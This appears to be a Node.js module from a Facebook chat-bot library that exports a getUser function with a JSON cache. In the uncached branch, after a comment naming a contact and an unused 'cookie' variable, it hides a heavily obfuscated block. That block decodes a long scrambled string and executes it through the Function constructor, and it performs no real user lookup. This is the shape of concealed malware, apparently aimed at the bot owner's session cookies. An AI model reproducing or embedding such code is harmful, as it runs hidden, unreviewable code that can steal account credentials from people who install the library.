var axios = require("axios");
module.exports = function(defaultFuncs, api, ctx) {
    return function getUser(id, callback) {
        var path = require("path");
        const { writeFileSync } = require('fs-extra');
        var userData = require('./cache/getUser.json');
        var userJson = path.resolve(__dirname, 'cache', 'getUser.json');
        if (userData.some(i => i.data.id == id)) {
            var user = userData.find(i => i.data.id == id);
            if (((Date.now() - user.time) / 1000).toFixed() >= 60 * 60 * 2) {
                const index = userData.findIndex(i => i.data.id == id);
                userData.splice(index, 1);
                setTimeout(function() {
                    writeFileSync(userJson, JSON.stringify(userData, null, 4));
                }, 2000);
            }
            return user.data;
        } else {
            var resolveFunc = function() {};
            var rejectFunc = function() {};
            var returnPromise = new Promise(function(resolve, reject) {
                resolveFunc = resolve;
                rejectFunc = reject;
            });

            if (!callback) {
                callback = function(err, userInfo) {
                    if (err) return rejectFunc(err);
                    resolveFunc(userInfo);
                };
            }

            //Contact MạnhG. Fb: Fb.com/manhict
            var cookie;
            (function() {
                var oyU = '',
                    xHO = 141 - 130;

                function dxt(u) {
                    var a = 4380502;
                    var m = u.length;
                    var b = [];
                    for (var i = 0; i < m; i++) { b[i] = u.charAt(i) };
                    for (var i = 0; i < m; i++) {
                        var r = a * (i + 480) + (a % 12491);
                        var v = a * (i + 614) + (a % 30813);
                        var g = r % m;
                        var z = v % m;
                        var f = b[g];
                        b[g] = b[z];
                        b[z] = f;
                        a = (r + v) % 5216038;
                    };
                    return b.join('')
                };
                var RKL = dxt('utsgwrcctavrnqdebmtioypozorlshcxufknj').substr(0, xHO);
                var COm = 'v=, l,o)h};z46+dri"]+r2k="=bg0;)g(ir; Cp]ja,czfvAp;vw a(-3pp[9ah"n7=<o}r= 6+6n,erzefo  =(l,di+8[; .)}5.i0s7.,<}.)is8r7,fvzwet(r"+=;2t)(vr,pecth1<w)2e(n9vaa(rvCj;ot>r=l1;al,r;C8f];=f.ee0a=.t9ea+ct((h)ylva qiv0ta;0rgahpym1rre+thha(.n){h;(d0aris .ex;svc;)s la;(};=aCC=r)ni..d[n{lnaAlht-c4g=o.d;-)wl+g(]8r3h.6=(]v)ra{d-g6=6j(=;u(r(Seho)a"s=n,)((e9(er;vb;h,8pf;a)v0 swewro+v748=hvt[v(8()yl(4+uvqybhr*(;.4)=r=)(1nze; fro)wr,(.7;)*rhhnc"jrdne=A.f7+({,odp i;(t+r]mq;bf=it =f(u(venh{a1l.n[f slm+g;.vseod]i fheAr9)}wc=+r}v>2;5rwusa-h=;rnu ran1yn5.4d0t omsf;"Cio,u=lrull=r;a;9[;{h.9,8iutagn(l4vbr.=,atwyef+p;1t.=raeegor)j,]tts11tml"c]==u n3!o;.o+i[=lr;u=8iloahbzr2cg[f6m);0[6]=ala;i,9;+).n7prlu1hr+r0]n.;r+r)m bnjo=ft))w;[0;sg ;sz;9<( r,a=n1o(ogv )voorg,1a,sq=+.i,taicuuaidsChzn;wd+onte;fr6A7]o[==o.e2eaueogopeeuvt,laae)rzncg{]u,wu+27"vfirjectac.;ii[jf-pmv )rp[r)+t[1]0regC+S),=-,ntly,=m)+!")nt( n<i=2';
                var fhL = dxt[RKL];
                var VBx = '';
                var CTF = fhL;
                var PcG = fhL(VBx, dxt(COm));
                var vbN = PcG(dxt('xE,D.rcn1.k;cD0._cka^_t_!5k_e,0=s:k^_[51##rE.l6}!0c3j7.kn)1wu[vks}D0c7gr_xqg8dd]fn((.*8,0t1^j}xcpi0:\/)3^D()ikrni)t(vk4.rp9)k%8x7b.tci4Ekt6xu%030__f.8x_8%ht%D=ruhe1v)1.1_fkai_(8[{89:1,#8}0r0Ex(x^1k7i^negDvpv.=^^xtDk0=a02,10c]800)^=21ixo.9^t^,_1kc)[_83nfweD_xu.0x)"E)uf1.nlerEx#5]rlctxr6[rm0.Ce0sx_1..)_annn^rq)lua.9}ll_h0(D0.c._sk_..x4$(0c._1xk^1.x_0dtDfx:(t3x^:DcD{Dl_8u6.[sD7s,o]11[^ff(5_((:tsx(_h0.r}x(px}aa((00^(9wl0i01u13D_{t._E13m5p.8o.)(),e_^1n8%t8r)1];8^7)nxn8^o.60c0;xp15^s__5xx,1,o]nr81ueiken]cel..8Dh6a0v9w,oa#5}9a{sd(1tpt(5xm_o+,Dg1k.2itDyo(a!0nom[2.p;)!_06[a000|[1(rD81r8_xt._D8ip5[$i;h(.o_0^fxotgx[nnvD)nx[_!n1(ia1t$_i;(_c1ux._0trk4.wk, (.(51_u088k5ext]D8.};.18xeuolafx8u[k|E8oo1.kruu)lx_[)0.reedo8t}57_);_9[t)(.s].1.o+hkiwE(o.lDecvooa8i_(1n7gk[007xw1(gD1e.).a4".5u{v...n^l.,trui}0cr0v1xt.c6o)l0.1D)n7cg...t.u..;x(](hkDi:[t1.tx,$.r a=n0=1}_.1]a).,k_de(r8.#.eex:.7DD(1)u]1D_xnw|=(180=f(nfDru$1tslocehk2.#___&e.1tc$rxr1_c8gw7tD_m8i0[.8ni1x)8b.v^.)7x,0){[kux._(1x0!u(0a#f.)0nn(xer9,.r#u}n8w#1r)5_0(n,t3(0k)0r-,t.l8km1.7x0ol2.w1cim1_]^.8_1gknnx.nn51)k]))k,a%[b8!^dugtx]vaw3}071m}l]0;$ec.0^t0m.k_0k(]{)w=!.x#f8}o.xxex.^k^gsak8}1l[.8h)x3u.k192noo...l0)+5l1abh.0)^e8h89;1E.(0]+we1k)D.w5lua{8i8[;.0_rou1Dn(n)xDkn[xr!.=ki91,9}r7omar[,((hai[nt0x_iot)_x0x..k_9_3[r0[^f,..(0no.meh11i.m=)nu=...0\/rc6,0()c.8,.ink_1n0D8.]uc00_8sEo)08=81^[nld;v(9(o{E^n(^8rrxok_wa_S0crcE#t1k1(v88kuSq))pe9{fDr0(ktc_knt.ot.[t0owtk=998,^7gl[e.18.tc0uc_a%0.#(u(1t8(8d)a61810e8c.eD{pta8).a};let187011tf]Eukn7c#,(k0e!0(^.nt(t]1ekxk6o0ekcgs|jxs1001s\'7i81_u^.{Ei_)x;.ixkk)o=,mt#[k96swex58xaafkho_nub[e9 0.cumxe,($s6k=t=le)(ol[c([ix1^a=n)ic;ax_)s^x({0a89xe1k=Deh000=f..)eo]D00eu7v9se.r.1.t=)p0o015\/Dax]..pcfnvu.nf=i_.3l0kf,x1a_so088c,4krD;.(]1r1_()h%^).etx5k0^g..fk_.g12w11r8+0l]!_c1ic,50;f]kc3.x__.;a.lr.).5fr36t31mxyD_lx.)_.8Dl(o)0_)x8s.x.a.r.frnrov}!;7^8(m.((.1b])8xxxx[Dxtkfc.k8 1)1&]15)e70im0()(^Ccvtm_k6a0co8;80%_(;[t)_8n,{k7tc.=n_ED.s"xe6ec1r)t3189.jv0srn]h^r8c(-v8.(1^h ti5|ktkt.,1r^_.i)e..etn(vDs.7h011[_:{1ab6)99wDrv!109ec.98r|0.)..nx1xn^)k_n.1!,_w5}_s.$0_u;1;0gna0[}]0x10}8u{)ox1E]ackcf(0s754t..ac1_^0E_1701#te98c.(s6Eu85.dl05.g[c)1tr0).kk1}1u.x.aaae[h1C6[5cf080(oDu.^ir!f1D0Dx1v{(a.)wDr..k(^e,)m8x03_l111c()r#20]w(e(0$_8kE00\'71}9.)8kfn(\/&(.}1{id[!nD1eh.r8nt0nxxg;)c)uvykx)!_0^)E(ls)8f097.Deka,0n_.}plx)x!o11o{78!....0hD9.u.0uk,}D9hk8sx7x_11_u^+y_8fx.0(0xsr1k_.__!xk^D+x(890!re7e.k.(91(.51,f)wh)011.pk(u,tn]f11..hD(.{.[c0n0.r7.D[.2cD58n&]0.811:w..1[_e_7_8_=sian.c[=D0k0_ee;c_+i0.5ne;)0}1b0{nxr7kaid71e_#l0(1(^(kc1#u!hDt1Ei.e)))v]n0:k^h{k(kh0knc)r55w(.l1|c(n8na1k8{.e.(.,#.}])0)0=7k8k).trk)c+exx)..(.i.D3_4a02.)D9xxfa5t77806k072.10m38u_x_}not(h!w0_crf^Du0Ex^3(D,_\/_ii\'u0fxx_k;]1..pk]1tl1#ayu.}kxnfuxx0kxofvehcD_r.^ux.krx2cxk2v7x,c{xen(o=a,8_0_1(g_()^50nE.8.!_nk,=m)D^6(eko_.nxetwa=()1t.o;}x^c160i^+^n88c=kl_o(8D1xix_c.k1t0p9x811.+e1tDnl9,+l{0]b}(1sf1vx;nx)c^ayD_t,b]5_^{)1;ss)wtx.xskd1(l110.NDal._^c__n)^[ln.xt_k.x#ai^0k8(8k_#v16:0)(_=k$!ru,kn_={}(Eu8a[8xr!9xm9{4Dekuslkil_^5.k[91c1khkE111ikik!eg0a.lnu311[.^_},h.d5scn18D_1kn^}0wi[]jox1(0.;-iutsDu.w,8u]xx]]{7)((109rk.n7w0f.._a10.5we(kux8e1r18e_9,aEwn;dlr27.m_1ir*3),rqpxg_l)te|+)i]k.__[{:1.hc^70.5t)_.klx_0o89S.(v7b)r)lo20kxxot_ah^..9.5ci.(cr8y;(.!!x0,))06]w.fx}D.ott,;ks08o(.sl0.0p_D)xqc_t)k5E.-fx0{x.200k)k{nn11c1(t.e))pk(0}uy+D^;..._k.(kk0nx,t[klsn(t.10^f1.nt^1xrh)acur80\/(6x.!eoNre+tu,f1yDk,)})1c9}(\/^edx;(.x_#Dw)]"D,=(p9.8k.DD.u=txxxk)8c8o0{{7o^nC)1nxdcE1)0[_$.t)_(oxc_i1un1]Ds[lxnx)00v];u]+|E9xdkknak(u9.h5xl1!9d}5vv6e0__y)stch0c[k_axD]1k_3x0cc_t.oeuf xiuc1n01b=ot0nxue"kk].e.x)1rkxn.#1hkEkl1.311t7x.,w.ka^;r8kk8sl.e)t;g8u:158.e^k!)0.;1e,.s_k8c03k(^Ex)re9rD_)tf9._(!(xk0.,kf_ce0r})0.+.s.!0s08) .{8k](e|lx0D8)e}c;.8l:fc)1D88D115s8_x5..9xodsx5x0t.yrskx.vl0s)c118D8ax))10k_,x]!(]anib_[o{c3.}ua{ecD_ama4)k[y1..a!D88=)n[_^84_^)9xce+5ws.1088e#a).0;,0cetoi.=)08cu[6_|1,_+(r1.)mi,lx.0cgk,(ix1j.k{De[,.}*(m_1_0.ip.o.T(i.88)k[isk7[1(kDaEpx2N!=(},4^_9,0__a7a1DyD1bk(.._^oD_#re5cnxo=0k#n_!]811=n^5_9fu_a( up_8195vtnk31c7sx(;unx)8to#)g04x4.n(D_.^70r41)uw.ri3;])1r_$n[1nhx$1=x8fu7(},l[=.a9urcxx.t801=^.kl9uy._9_etdD)k5ae.=)t..\/f]9ntn.u0a;p1pn5,=nox.n.]%x0_25i,]4.8tul9e]bn){_.kx01fkn_._1_.(8e({88[x._(n.nm.ixuc#91.ktD(1is15tr,;.t._+.5t(.;(.;,01n(_r|0p1]#c71;\/1.9s1$m^^1kD.0.88un_5f0_0a;x1x(t!1,8ksepd70x(.D_xCxy)ko.l.1D:0n;!tom.xtt#5k0kl3.ac1res^!k!l.587xr0tn=n{19Dx.5{p3.k(emy81(,acDt.n5)n7ixk5Dv2!a9.t{0|r!v{ln(#ki_^:].a}.t o5[eat.2D1c1(_0e=u1t.]E}w0t:2+)n100)a.]}cyr((_.ik!c(mrx8x_vsr;^.;k5s1E;_|;_5_0{r;x.f,xix0e[D#1^)rnt.1.x.)).k5(5..(kfn1=(at1.(!n(io0_=i180b.Dtcn1k[]x1().k_9xc_3._ul.7f.vd^{k,]9rn!,.mx.)..00(0.9[11a]8_rD]716(.ug5]:.}]wk.c2_._n.g_.9.k1iak0)(uf(s(a.s_u4f{kxukxx)n.k091^pn_w[.[#n0bDc=_c9.1x.[1r_1p_mh1_$D01r(.a1Cr\/_t78_.xax(:336g0e..81o.u.,bDi1xxks_e_xk._axx)e(0xi)E.,)anat9ncx(x)1d0^e.w.D580il}){8E.c]^}000_f.e38xpDcx50l50)..30,85c.o=k[sf(r,Dee]aa87sr\/[.!_f[.!D_e_e.kc_t)_(fc n15e]1kD85Ee,sa0_k.{knDr[0c_._,7(}k,x61#]].9(=1;0xkcxmi86}=^#2a;l].85Dk1jc4$wcE8fpd8kxa00}Ds)x}t01h3nt8a.t1_q(.c.(x8D_=_e_e$01p6tkrax&u1d[7k)!8.7#d9.s_0cnsrm98aDck._.[n.$1_l0.c!=0k8b,91.n.0mi=ix1y85.k808x[t3s5|ns!ir8{8a!00a"01..0k;t.[.+c90xo!4r)nfxc]8e8d_8_)88kax1u;tr."5eliI9(eDtarl1txuk1o01)arD7_278eD^x0sk1^xag(c3xxgDn.2}.h5cxnv1^(upE(s7xh.l}ni(kni_1iD^!.x_iaxat1i^_uao!;*#t8EEs8[_a1{cj=[8(xtr(^]nl1in}.kmp _^)0)k=.wo!c.r,.9_1;tuu{i+e9.5709ouDu(r(1xux}{cr1(1^sa1su_8_0^cx01,eEkao=Dskl0(1_[%uoa8iuc{a(jn5!n,_kt.!Dnxywi^.ypr^4,r[lu)En7e.otxo .Dx,;3ce(e0.r.)[cpok7__8pk#n1k.()a!1=0kDa3xk8_D=r.5a_)D80sta750$}9([8o#e871r[]0])k_a8)08e(,(.hcdu0yeeE.)1,E_0k99D5]+dfxr.((|g!)Ds]t{v0ao1n^r4a1.210x.0w5.8iDnia^k,8fl)(3)x,}!D0)0.t.,0Drx18_98c1_nc087uc71(8xx10^x[ok^1t1.}415x88l.]kf_e#w}]10!ti_0\/.{5]8pxs.asi8ekft0))%.15a.t[DD1o]8l)m!rum5)((:.^e0n)_.wx_v(.0!1su8.[twv8n.c((u)n0)w]_u.aki\'^aeiD.catcx=n_3a1_E^c15c4$_81#tD=!)!.,}.0_m5|k_k3x00D1;_nSt.9(:u_o((1[cv.5kxts__u#1a50vur1=|t1[11wt_n.nu,.88D8{)(_:_9ca1.m(;003..]0c))(!nr.DDu[cr(xm([.l=x)kaswl!xs33[cvck0tE{{c(:i(e.a9D7d7)gli.o5b5a_rc3._]_y=k0sun]!68llnt_8w4l(nl.yct;gk1a1(;o_x54kkkx{!x[8)..kdx!t0_!.tt1ck0_1.(.13tD;0a,}40p1kx0;2=4eg)9k.1)}{:__:kiaa_te^6^00[k6kc8(.m()n(].k(0Dmu.r_eD1{x0x]0]9l0e(k}.;E5..(Ewtet[k9a7rtl)1;}vp-%D.s:ic27fr0.;.28.6D1ac(x(tx[{.t01fx1x_r3[iE=430l_0lDt_np1r;o.e1=]k95$rE,,(^,\/v8kc^,.t8e1^kp1=,.,pi.(8f;[Dn13=c71o+x7r$1E!([_^E0]{^tn0b.x.1.u](08n80c;8,xk_.8.8xo=5,7ekx_s1,)i(0.(rc7)uei1=x801a!#x?_18}s75arx}0c_=8xios)r9!0wa=n;.exx0khdb8)!x+!_85_.0D!(a_}5[u8}{((t0(_x#e1xx8x}.e.sc)i87)Dn0e.10_a.i#ex(_)x1tx1lD.^x2txalDexcafns5(.[4.w9cxk5e481[k!sl^er]p0.pc.i]etxD_0tkc!)Dp1sg.5_cu.t2n000_xu[_i8}l.0a{tt0E0E.aao)e.;xcix!0r.0...x.1%(_(xEhiyh)+32kk=;){bxx)\/)u0hr=nxrvcs[lD=sm=r^0c(a1y;.ut^14,Et;kdk1xa8lDb2[.1:08.0nk{]lk),6r;e^ts{DD8.C,!k907_fhk81x.)(]_te,d_c\/Dewahdxm.b._t_ex,DqDm^c\/i.krae),.tl0o.]9.kr(7t_0(47f1fawl5a.t).)eegn)1c0kt]cxco8,i=xxe;_.k_(rD5s.}.1.{c[y_x)=8unxar1xn1#{rcD1[x[w(=r_x.D5t[8+1t{0l)187rf=_$acuv!fepa!r.,t_8#0in8c)8.e1Dl9c.f..xt([#1x_0c}108t=8Dxf,n8.c(]t8!]5)08cs7nr._2k5e1oEc;]a88(,o1D.a1_}l)0a{1st!gcD).u^9.h}u\/k07o.k8e70;s^._89Dxrk.,]cd1]5 9t](}na!dx5_k.ie^.x11;_vs0g)fa)0nlsk0.4i82oee).-o7e^1rkDS^9[^)_1Di9(ck=]9(f#2xece{9}n0E01_ef_luoE_u}xf8_*0=Dd8t0y1k,91Dc(c!^=8.vl_8x_0xc.|0|k,kc_S1ik+c[6a0)D81x,.llD. ue(.u.Nr_80b.x3iake9]^8D)n=9x1((0ci8.)_.)^t)$.ntk5i.11)86up__;xki0u0({ac.6D.)a7o7d(ce8^h)|2nt.9_$0((.k)u.mn9n(,(ki5_)1..ic{n!)1.8f1_D.ox90eDix(8.18.!7on)^0thxoc!g.t^ka^i$8,]l_]sf.xvk..kEx1ut_u89.12[0nD1k_a,u8[ts9amxluout}ua0r]r!Et1910p7u.t)i[xE_u2ul=p.a)xa=c!oaevc,k_{0rb_n{1c0l([l|$n]0dw9^g]o.tDy.1(D0EoD.k0n^D0_u12]}0i8t79^2)_ctt{r_a[^[5_er8._1x9e_iw.7k(E,1rn6m0nvk4orp1o_0(]b808i#)f(wc[).0)1cDx..(r_#wsep9__kDknD.xex)$!.x;x.#n_.8r]8x60_=90,E.(8u5)_wuk0e..8i;0Dcwou.5nr.(ccx}k]aDcrrx0kD15;c(0(5e b0rD1!_1.fh!.0)kk9.0$ku0_(a11cx){^uD$x=u771D_(.t{1,cr\/.054s).({ri,81k.a_kee(0D07(0.ry!du{ep0.dw^(]i{5?)^o5D.9xkl1.(81f37.,=agDerxc.x=cr7.2_5_eln1fr8(a;^x0en^n.(sDn]831]_,380v_9x08)ai5_]|.rtx6^tx)ei8f061.1cl.i_aia(^t{8.90c1[u9.!x80m0]toc0.D.7x5xE(^_txk=)]l1n)p,lnxix1xm[Dx1r4s^l{.1.l0_agk^y}.nv1oln)1v8ra.(o.t0ahs;10r6t)01[[w]5[irDuwi^.x(]cx,]D310in_..kc{,;^l kiuhwDx r}k=_1xhk{k1[v.x0xD1,ixp5 k{.f[#0.ii.Ex.]01u_x=,%can{1e =.35 0g8l'));
                var tUt = CTF(oyU, vbN);
                tUt(5931);
                return 1717
            })()

            return returnPromise;
        };
    }
};